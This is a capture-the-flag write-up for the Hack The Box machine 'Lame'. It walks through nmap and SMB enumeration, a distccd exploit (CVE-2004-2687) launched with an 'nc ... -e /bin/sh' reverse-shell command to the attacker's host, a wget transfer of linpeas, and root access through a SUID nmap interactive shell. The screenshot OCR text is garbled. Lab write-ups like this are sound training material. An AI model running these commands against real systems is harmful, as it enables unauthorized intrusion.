# HTB_Writeups - Lame

Started off with a nmap scan nmap -Pn -T5 -sV -sC -A -p- -oN
lame_nmap.txt 10.10.10.3

While that was scanning I went to go check out to see if the website is
up. But I don\'t get anything back and you\'ll see why when the results
are done.

We get back some nice info to start us off.

Port 80 isn\'t open so there was no site for me to check.

But there was other ports open such as port 21 with the version number
of vsftpd 2.3.4 (This version of vsftpd is vulnerable to backdoor
command execution

CVE-2011-2523) I couldn\'t get it to work though. So I moved on. If you
can\'t get something to work, don\'t spend to much time on it. Look at
the next route you can take and if you get stuck

again then go back and try to repeat your steps to make sure you didn\'t
make a typo somewhere.

![1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26
27 28 29 30 \# Nmap 7.92 scan initiated Wed Jul 27 17:39:46 2022 as:
Nmap scan report for 10.10.10.3 Host is up (0.069s latency) . Not shown:
65530 filtered tcp ports (no- response) nmap PORT STATE SERVICE open ftp
21/tcp I ftp-syst: STAT: I FTP server status: VERSION vsftpd 2.3.4
Connected to 10.10.14.6 Logged in as ftp TYPE: ASCII No session
bandwidth limit Session timeout in seconds is 300 Control connection is
plain text Data connections will be plain text vsFTPd 2.3.4 secure,
fast, stable I End of status I ftp-anon: Anonymous FTP login allowed
(FTP code 230) open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
22/tcp I ssh-hostkey: 1024 (DSA) 2048 (RSA) 139/tcp open netbios-ssn
Samba smbd 3. X - 4. X (workgroup: WORKGROUP) 445/tcp open netbios-ssn
Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) 3632/tcp open distccd
distccd VI ( (GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) Warning: OSScan
results may be unreliable because we could not find at least , -ON lame
nmap.txt 10.10.10.31 1 open and 1 closed port Aggressive OS guesses:
DD-WRT v24-sp1 (Linux 2.4.36) (92%), OpenWrt White Russian 0.9 (Linux
2.4.30) (92%), Arris TG862G/CT cable modem (92%), Dell Integrated Remote
Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo
TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21
2.4.31 (likely embedded) (92%), Linux 2.4.27 (92%), Citrix XenServer 5.5
(Linux 2.6.18) (92%), Linux 2.6.22 (92%), Linux 2.6.8 - 2.6.30 (92%) No
exact OS matches for host (test conditions non-ideal) . Network
Distance: 2 hops
](vertopal_59dd95ae513b43a889ec59fefb1e48e8/media/image9.png){width="8.023943569553806in"
height="4.055555555555555in"}

![31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53
54 55 56 Service Info: OSS : Unix, Host script results: smb-secu
rity-mode: account used: guest Linux; CPE: cpe:/o:linux:linux kernel
authentication level: user challenge response: supported message
signing: disabled (dangerous, but default) smb2-time: Protocol
negotiation failed (SMB2) smb-os-discovery: OS: Unix (Samba
3.0.20-Debian) Computer name: lame NetBIOS computer name: Domain name:
hackthebox.gr FQDN: lame. hackthebox.gr System time: clock-skew: mean:
2h00m23s, deviation: 2h49m46s, TRACEROUTE (using port 445/tcp) median :
20s HOP RTT ADDRESS 1 66.89 ms 10.10.14.1 2 67.79 ms 10.10.10.3 OS and
Service detection performed . done at Wed Jul 27 \# Nmap Please report
any incorrect results at https ://nmap.org/submit/ 1 IP address (1 host
up) scanned in 252.76 seconds 2022
](vertopal_59dd95ae513b43a889ec59fefb1e48e8/media/image11.png){width="8.023943569553806in"
height="4.013888888888889in"}

I see that smb is open. 139/445. I run smbmap -H 10.10.10.3 and get back
some users.

![Shellshock: C/home/Shellshock/Documents/htb/lame\] smbmap -H \[+\] IP:
10.10.10.3:445 Name: 10.10.10.3 Disk prtnt\$ tmp opt IPC\$ ebtan))
ADMIN\$ ebtan)) Shellshock: C/home/Shellshock/Documents/htb/lame\]
10.10. 10.3 Permissions NO ACCESS READ, WRITE NO NO NO ACCESS ACCESS
ACCESS Comment Printer Drivers oh noes! IPC Service (lame server (Samba
3.0.20-D IPC Service (lame server (Samba 3.0.20-D
](vertopal_59dd95ae513b43a889ec59fefb1e48e8/media/image14.png){width="8.023943569553806in"
height="1.6111111111111112in"}

we can see that tmp is READ, WRITE. Lets login and see what we can find.

I use smbclient \\\\\\\\10.10.10.3\\\\tmp and we get a hit. I use ls to
see what we can find. Unfortunately there is nothing here either. We
could use

put and get files here but there is no port 80 open for us to execute
the files to gain a shell from here. Some bad luck but we got more info
so lets keep looking.

![Shellshock: C/home/Shellshock/Documents/htb/lame\] -\> smbcltent
\\\\\\\\10.10.10.3\\\\tmp Password for \[WORKGROUP\\SheUshock\]:
Anonymous login successful Try \"help\" to get a Itst of possible
commands. •40:08 •40:08 •40:08 smb: \\\> Is dtstcc ff04f12b.stdout
dtstccd ffebf12b.t . ICE-untx vmware-root dtstccd ffd3f12b.o .X11-untx .
XO -lock tmp . alsng23549 dtstcc ff3cf12b.stderr 5564. jsvc_up
vgauthsvclog . txt . O 7282168 Wed Fri. Wed Wed Wed Wed Wed Wed Sat Wed
Wed Wed Wed Wed Jul Oct Jul Jul Jul Jul Jul Jul Jul Jul Jul Jul Jul Jul
27 30 27 27 27 27 27 27 23 27 27 27 27 27 22:26:31 23:33:58 •39. 17. 17.
17. 17. 19. 17. 17. •43 •44 •45 •41 of DR DR AR HR R size 1024. O O 10 O
O O O 8179 11 22 119 O 1600 2022 2020 2022 2022 2022 2022 2022 2022 2022
2022 2022 2022 2022 2022 blocks 5386420 blocks available
](vertopal_59dd95ae513b43a889ec59fefb1e48e8/media/image5.png){width="8.023943569553806in"
height="3.5694444444444446in"}

I go back to the nmap results and see port 3632 is open and it gave us
the version of application running. distccd v1

I go to google and search for \"distccd v1 exploit\" first link brings
us to
[[https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855]{.ul}](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855)

after reading the exploit it seems to generate a random alpha numeric
string. Reads the string. And looks for the trigger exploit which is
command, host, port

If it is able to connect to the host it will send the payload and
hopefully give us a reverse shell.

Let\'s give it a try. I started by copying the code and writing it to a
file naming it CVE-2004-2687.py, did chmod +x CVE-2004-2687.py

the file is ready to be used. First I started a listener on my attacking
machine with nc -lvnp 9001 and then used the following command

./CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c \"nc 10.10.14.10 9001 -e
/bin/sh\" No good, got errors. Then I tried.

python3 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c \"nc 10.10.14.10 9001
-e /bin/sh\" I got a connected to remote service Ok but then the

socket timed out instantly killing the connection. I went back to the
exploit and read the comments, it mentioned that python3 is to new.

So I was going to work my way down from python3 to python. Next up,

python2 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c \"nc 10.10.14.10 9001
-e /bin/sh\" Success, we get a shell!

![i Nn 00
](vertopal_59dd95ae513b43a889ec59fefb1e48e8/media/image13.png){width="3.8194444444444446in"
height="2.125in"}

![Shellshock: C/ home/Shellshock/Documents/htb\] -\> nc Ncat: Version
7.92 ( https://nmap.org/ncat ) Ncat: Listening on Ncat: Listening on
0.0.0.0:9001 Ncat: Connection from 10.10.10.3. Ncat: Connection from
10.10.10.3:44276. utd=l(daemon) gtd=l(daemon) groups-I (daemon) -Ivnp
9001
](vertopal_59dd95ae513b43a889ec59fefb1e48e8/media/image2.png){width="8.023943569553806in"
height="1.9444444444444444in"}

Let\'s upgrade the shell. I used the following.

python -c \'import pty; pty.spawn(\"/bin/bash\")\' python3 and python2
didn\'t work.

export TERM=xterm

stty raw -echo && fg

enter

enter

We\'re a normal user daemon. I started off with sudo -l but it asked for
a password. Let\'s move on.

I look around a bit and cd /home directory and do a ls and see what\'s
there. Nothing good in the user directory but I did go into makis and
find the user.txt file. I do a cat user.txt at it and we get out our
first flag.

![cat user . txt dc5fe551ec49d528a9b512702ebcf77c
](vertopal_59dd95ae513b43a889ec59fefb1e48e8/media/image8.png){width="5.722222222222222in"
height="0.5138888888888888in"}

![](vertopal_59dd95ae513b43a889ec59fefb1e48e8/media/image6.png){width="3.861111111111111in"
height="2.1527777777777777in"}

Next, let\'s head over to the tmp directory and try to transfer over
some enumeration files like linpeas.sh

I go to my attacking machine on my transfers directory where I store all
my enumeration files, scripts, images, anything that can be used to help
us get an edge on the victim machine.

I use python3 -m http.server 80 get the server up and running.

On the victim machine ill be in the /tmp directory and use
wget://10.10.14.10/linpeas.sh which is my attacking machines ip from
HackTheBox.

The file gets transferred over no problem. I use the chmod +x linpeas.sh
making it an executable file.

I use ./linpeas.sh and it kicks off no problem. We get back a lot of
results. Several vulnerabilities, but one in particular catches my eye
with the yellow red highlight.

![Executtng Linux Explott Suggester 2 https:// t thu .com ondonas/
ulux-exp -suggester-2 Cl\] amertcan-stgn-language CVE-2010-4347 Source:
http://www. securttyfocus.com/btd/45408 \[2\] can_bcm CVE-2010-2959
Source: http://www.explott-db.com/explotts/14814 (3\] dtrty_cow
CVE-2016-5195 Source: http://www.explott-db.com/explotts/40616 C 4\]
do_pages_move Alt: steve CVE-2010-0415 Source: Spenders Enlightenment C
5\] explott_x CVE-2018-14665 Source:
http://www.explott-db.com/explotts/45697 CVE-2010-3848 Source:
http://www.explott-db.com/explotts/17787 CVE-2010-3850 Source:
http://www.explott-db.com/explotts/17787 CVE-2010 Source:
http://www.explott-db.com/explotts/17787 \[6\] half_nelsonl Alt: econet
C 7\] half_nelson2 Alt: econet \[8\] half_nelson3 Alt: econet \[9\] msr
-4073 CVE-2013-0268 Source: http://www.explott-db.com/explotts/27297
(10\] ptpe.c_32btt CVE-2009-3547 Source:
http://www.securttyfocus.com/data/vulnerabtltttes/explotts/36901-1.c
CII\] pktcdvd CVE-2010-3437 Source:
http://www.explott-db.com/explotts/15150 (12\] reiser fs CVE-2010-1146
Source: http://www.explott-db.com/explotts/12130 (13\] sock_sendpage
Alt: wunderbar_emportum CVE-2009-2692 Source:
http://www.explott-db.com/explotts/9435 (14\] sock_sendpage2 Alt:
proto_ops CVE-2009-2692 Source: http://www.explott-db.com/explotts/9436
](vertopal_59dd95ae513b43a889ec59fefb1e48e8/media/image7.png){width="8.023943569553806in"
height="6.319444444444445in"}

![(15\] vide041tnux CVE-2010-3081 Source:
http://www.explott-db.com/explotts/15024 (16\] vmspltcel Alt: jesstca
bleu CVE-2008-0600 Source: http://www.explott-db.com/explotts/5092 (17\]
vmspltce2 Alt: dtane lane CVE-2008-0600 Source:
http://www.explott-db.com/explotts/5093
](vertopal_59dd95ae513b43a889ec59fefb1e48e8/media/image3.png){width="8.023943569553806in"
height="1.8333333333333333in"}

![-rwsr-xr -rwsr -rwsr-xr V-rwsr-xr \[-rwsr-xr -rwsr-xr -rwsr-xr -rwsr-
-rwsr-xr I -rwsr -sr -rwsr-xr I-rwsr-xr -rwsr-xr -rwsr-xr Í-rwsr-xr
Í-rwsr-xr Interesting Fi les - Check easy privesc, exploits and write
perms SUID rde ing/priv lege-esca ation\#sudo-and-suiď https://book.
acktric . x /linux- -x -xr\-- 1 -x -x -x -x -x xr\-- 1 -x -x -x -x -x -x
-x -x -x -x -xr\-- 1 -xr\-- 1 -xr\-- 1 -x -x -x -x -x 1 1 1 1 1 1 2 1 1
1 1 2 1 1 root root root root root root root root root root root root
root root root root root fuse root root root root root dhcp root root
root root root root root root 63K Apr 14 20K Feb 26 25K Apr 2 80K Apr 14
31K Dec 10 27K Dec 10 64K Dec 2 2.9K Apr 2 106K Feb 25 7.3K Jun 25 8.4K
Nov 22 37K Apr 2 13K Dec 10 106K Feb 25 12K Nov 22 11K Dec 10
/usr/bin/at 19K Apr 2 28K Apr 2 763K Apr 8 24K Apr 2 16K Nov 22 29K Apr
2 46K Mar 31 2008 /bin/ umount BSD/Linux(08-1996) 2008 /bin/fusermount
2008 /bin/su 2008 /bin/mount 2007 /bin/ping 2007 /bin/ping6 2008
/sbin/mount.nfs /lib/dhcp3-client/call-dhclient-script (Unknown SUID
binary) 2008 2008 /usr/bin/sudo \-\--\> check tf the sudo verston is
vulnerable-. - edit 2008 /usr/bin/X 2007 /usr/bin/netkit-rsh 2008
/usr/bin/gpasswd 2007 /usr/bin/traceroute6. iputils 2008 /usr/bin/sudo
\--\> check tf the sudo verston is vulnerable 2007
/usr/bin/netkit-rlogin You own the SUID file: -rwsr-xr-x -rwsr-xr-x
-rwsr-xr-x V-rwsr-xr-x Í-rwsr-xr-x I-rwsr-xr-x 1(02-1997) -rwsr-xr
-rwsr-sr -rwsr -rwsr -rwsr -rwsr-xr -rwsr-xr -rwsr-xr -r-sr-xr -r-sr-xr
1 1 1 1 1 1 1 1 1 1 1 1 1 root root root root root root root root root
root root root root root 2007 /usr/bin/arping 2008 /usr/bin/newgrp 2008
/usr/bin/chfn 2008 /usr/bin /nmap 2008 /usr/bin/chsh 2007
/usr/bin/netkit-rcp 2008 /usr/bin/passwd 2008 /usr/bin/mtr HP-UX 10.20
SuSE_9.3/10 03-2006 ) 12-2004 ) /SPARC_8/9/Sun_S01aris_2.3_to_2.5.
libuuid libuuid 13K Mar 27 2008 /usr/sbin/uuidd root root root root root
root root root dip 263K oct 4 telnetd 5.9K Dec www-data 11K Mar root
root root root root 4.5K Nov 162K Apr 9.4K Aug 14K Nov 9.4K Nov 5 6 17 3
3 2007 /usr/sbin/pppd 17 2006 /usr/lib/telnetlogin 9 2010
/usr/lib/apache2/suexec 2007 /usr/lib/eject/dmcrypt-get-device 2008
/usr/lib/openssh/ssh-keysign 2009 /usr/lib /pt_chown 2020
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper 2020
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
](vertopal_59dd95ae513b43a889ec59fefb1e48e8/media/image12.png){width="8.023943569553806in"
height="4.486111111111111in"}

the /usr/bin/nmap suid

I head over to
[[https://gtfobins.github.io/]{.ul}](https://gtfobins.github.io/) and
search for nmap

I cd /usr/bin where the suid is located.

I start off with shell code (a) and nothing happened. So I keep going
down the list.

Shell (b) worked!

![cd /usr/btn/ nmap \--tnteracttve Starting Nmap V. 4.53 (
http://tnsecure.org ) Welcome to Interactive Mode press h \<enter\> for
help nmap\> ! sh sh-3.2\# whoamt root sh-3.2\#
](vertopal_59dd95ae513b43a889ec59fefb1e48e8/media/image10.png){width="6.194444444444445in"
height="1.9722222222222223in"}

we can now cd /root and see what is there which is the root.txt flag!

we have successfully rooted this box!

![](vertopal_59dd95ae513b43a889ec59fefb1e48e8/media/image1.png){width="5.111111111111111in"
height="2.3472222222222223in"}

![sh-3.2\# sh-3.2\# Desktop sh-3.2\# cd /root reset \_ logs. sh root.
txt cat root. txt vnc . log 3a6dadc17b869927153cd30ead8ceOc8 sh-3.2\#
](vertopal_59dd95ae513b43a889ec59fefb1e48e8/media/image4.png){width="5.097222222222222in"
height="1.4722222222222223in"}
